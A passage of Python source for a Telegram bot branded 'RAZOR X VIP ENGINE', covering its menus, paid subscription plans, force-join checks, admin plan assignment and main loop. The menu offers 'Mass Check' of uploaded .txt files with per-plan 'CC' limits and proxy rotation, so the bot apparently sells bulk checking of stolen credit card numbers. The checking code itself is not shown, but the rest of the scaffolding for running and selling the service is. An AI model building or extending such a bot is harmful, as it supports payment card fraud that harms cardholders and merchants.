async def check_joined_cb(event):
    uid = event.sender_id
    if uid in ADMIN_ID: return await event.answer(f"✅ Admin Verification Complete!", alert=True)
    if await is_user_joined(uid):
        await mark_user_joined(uid)
        await event.answer(f"✅ Successfully Verified!", alert=True)
        try: await event.delete()
        except: pass
        await styled_send(event.chat_id, f"<b>⦗ ✨ ⦘ 𝗪𝗘𝗟𝗖𝗢𝗠𝗘</b>\n𝗦𝗲𝗻𝗱 <code>/start</code> 𝘁𝗼 𝘀𝗲𝗲 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝘀.")
    else: await event.answer(f"❌ You are not joined!", alert=True)

# ====================== UI / PLANS ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.](start|cmds?|commands?)$'))
async def start(event):
    try:
        await ensure_user(event.sender_id)
        if not await force_join_check(event): return
        plan = await get_user_plan(event.sender_id)
        limit = get_cc_limit(plan, event.sender_id)
        
        text = f"""<b>⦗ ⚡ ⦘ 𝗥𝗔𝗭𝗢𝗥 𝗫 𝗩𝗜𝗣 𝗘𝗡𝗚𝗜𝗡𝗘</b>

<b>├ ⦗ 💳 ⦘ 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚</b>
<b>│ ╰</b> <i>𝗦𝗲𝗻𝗱 𝗮 .𝘁𝘅𝘁 𝗳𝗶𝗹𝗲 𝘁𝗼 𝗮𝘂𝘁𝗼-𝘀𝘁𝗮𝗿𝘁 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸!</i>

<b>├ ⦗ ⚙️ ⦘ 𝗣𝗥𝗢𝗫𝗬 𝗠𝗔𝗡𝗔𝗚𝗘𝗥</b>
<b>│ ├</b> <code>/addpxy</code> ⇾ 𝗔𝗱𝗱 𝗣𝗿𝗼𝘅𝗶𝗲𝘀
<b>│ ├</b> <code>/proxy</code> ⇾ 𝗩𝗶𝗲𝘄 𝗣𝗿𝗼𝘅𝗶𝗲𝘀
<b>│ ╰</b> <code>/rmpxy</code> ⇾ 𝗥𝗲𝗺𝗼𝘃𝗲 𝗣𝗿𝗼𝘅𝗶𝗲𝘀

<b>╰ ⦗ 👤 ⦘ 𝗔𝗖𝗖𝗢𝗨𝗡𝗧</b>
<b>  ├</b> <code>/info</code> ⇾ 𝗬𝗼𝘂𝗿 𝗣𝗿𝗼𝗳𝗶𝗹𝗲
<b>  ╰</b> <code>/plan</code> ⇾ 𝗩𝗶𝗲𝘄 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻𝘀

<b>⦗ 💎 ⦘ 𝗬𝗢𝗨𝗥 𝗣𝗟𝗔𝗡 ⇾</b> <code>{plan.upper()} ({limit} 𝗠𝗮𝘀𝘀 𝗟𝗶𝗺𝗶𝘁)</code>"""
        
        kb = [
            [Button.inline("⦗ 💎 ⦘ 𝗩𝗜𝗘𝗪 𝗣𝗟𝗔𝗡𝗦", b"show_plans")],
            [Button.url("⦗ 📢 ⦘ 𝗖𝗛𝗔𝗡𝗡𝗘𝗟", JOIN_CHANNEL_LINK), Button.url("⦗ 💬 ⦘ 𝗚𝗥𝗢𝗨𝗣", JOIN_GROUP_LINK)]
        ]
        await styled_reply(event, text, buttons=kb)
    except Exception as e: await event.reply(f"⚠️ Error in /start: {e}")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]info$'))
async def info_cmd(event):
    if not await force_join_check(event): return
    plan = await get_user_plan(event.sender_id)
    limit = get_cc_limit(plan, event.sender_id)
    status = "Active" if is_paid_plan(plan) else "Free"
    
    text = f"""<b>⦗ 👤 ⦘ 𝗣𝗥𝗢𝗙𝗜𝗟𝗘 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡</b>

<b>├ 𝗜𝗗:</b> <code>{event.sender_id}</code>
<b>├ 𝗦𝘁𝗮𝘁𝘂𝘀:</b> <code>{status}</code>
<b>├ 𝗣𝗹𝗮𝗻:</b> <code>{plan.upper()}</code>
<b>╰ 𝗟𝗶𝗺𝗶𝘁:</b> <code>{limit} 𝗖𝗖𝘀</code>"""
    await styled_reply(event, text)

@client.on(events.CallbackQuery(data=b"show_plans"))
async def plans_cb(event):
    await event.answer()
    cp = await get_user_plan(event.sender_id)
    plans_text = f"<b>⦗ 💎 ⦘ 𝗩𝗜𝗣 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 𝗣𝗟𝗔𝗡𝗦</b>\n\n"
    for pid, pi in PLANS.items():
        plans_text += f"<b>├ {pi['emoji']} {pi['name']}</b>\n<b>│ ├ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻:</b> <code>{pi['duration_days']} 𝗗𝗮𝘆𝘀</code>\n<b>│ ╰ 𝗣𝗿𝗶𝗰𝗲:</b> <code>{pi['price']}</code>\n<b>│</b>\n"
    
    plans_text += f"<b>╰ ⦗ 👤 ⦘ 𝗬𝗢𝗨𝗥 𝗖𝗨𝗥𝗥𝗘𝗡𝗧 𝗣𝗟𝗔𝗡 ⇾</b> <code>{cp.upper()}</code>"
    kb = [[Button.url("⦗ 👑 ⦘ 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗢𝗪𝗡𝗘𝗥 𝗧𝗢 𝗨𝗣𝗚𝗥𝗔𝗗𝗘", "https://t.me/Dddadddyttt")]]
    await styled_edit(event, plans_text, buttons=kb)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan$'))
async def show_plans(event):
    if not await force_join_check(event): return
    cp = await get_user_plan(event.sender_id)
    plans_text = f"<b>⦗ 💎 ⦘ 𝗩𝗜𝗣 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 𝗣𝗟𝗔𝗡𝗦</b>\n\n"
    for pid, pi in PLANS.items():
        plans_text += f"<b>├ {pi['emoji']} {pi['name']}</b>\n<b>│ ├ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻:</b> <code>{pi['duration_days']} 𝗗𝗮𝘆𝘀</code>\n<b>│ ╰ 𝗣𝗿𝗶𝗰𝗲:</b> <code>{pi['price']}</code>\n<b>│</b>\n"
    
    plans_text += f"<b>╰ ⦗ 👤 ⦘ 𝗬𝗢𝗨𝗥 𝗖𝗨𝗥𝗥𝗘𝗡𝗧 𝗣𝗟𝗔𝗡 ⇾</b> <code>{cp.upper()}</code>"
    kb = [[Button.url("⦗ 👑 ⦘ 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗢𝗪𝗡𝗘𝗥 𝗧𝗢 𝗨𝗣𝗚𝗥𝗔𝗗𝗘", "https://t.me/Dddadddyttt")]]
    await styled_reply(event, plans_text, buttons=kb)

# ====================== ADMIN COMMANDS ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan1\b'))
async def plan1_cmd(event): await _handle_plan_assign(event, "plan1")
@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan2\b'))
async def plan2_cmd(event): await _handle_plan_assign(event, "plan2")
@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan3\b'))
async def plan3_cmd(event): await _handle_plan_assign(event, "plan3")
@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan4\b'))
async def plan4_cmd(event): await _handle_plan_assign(event, "plan4")

async def _handle_plan_assign(event, plan_key):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split()
    if len(parts) < 2: return await styled_reply(event, f"<b>⚠️ 𝗦𝘆𝗻𝘁𝗮𝘅:</b> <code>/{plan_key} user_id</code>")
    try: target_uid = int(parts[1])
    except: return await styled_reply(event, "<b>⚠️ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗜𝗗</b>")
    
    pi = PLANS[plan_key]
    await set_user_plan(target_uid, pi["tier"], pi["duration_days"])
    await styled_reply(event, f"<b>✅ 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝘂𝗽𝗴𝗿𝗮𝗱𝗲𝗱 𝘂𝘀𝗲𝗿 𝘁𝗼 {pi['name']}</b>")

# ====================== MAIN LOOP ======================
async def main():
    global client_instance
    client_instance = client
    await init_db()
    
    try:
        async with aiohttp.ClientSession() as session:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook?drop_pending_updates=true"
            async with session.get(url) as resp: await resp.json()
    except: pass

    await get_github_sites()

    while True:
        try:
            await client.start(bot_token=BOT_TOKEN)
            print("✅ VIP BOT STARTED WITH ZERO ERRORS!")
            await client.run_until_disconnected()
        except FloodWaitError as e:
            await asyncio.sleep(e.seconds + 5)
        except Exception as e:
            await asyncio.sleep(10)

if __name__ == "__main__":
    asyncio.run(main())
